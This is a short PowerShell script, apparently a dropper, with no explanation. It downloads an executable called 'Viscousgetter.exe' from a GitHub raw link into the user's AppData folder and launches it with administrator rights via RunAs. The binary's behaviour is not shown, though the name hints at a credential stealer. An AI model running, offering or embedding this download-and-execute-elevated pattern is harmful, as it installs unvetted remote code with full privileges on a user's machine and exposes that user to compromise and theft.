$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
$VISPath = "$env:AppData\Viscousgetter.exe"
Invoke-WebRequest -Uri $VIS -OutFile $VISPath
Start-Process -FilePath $VISPath -Verb RunAs

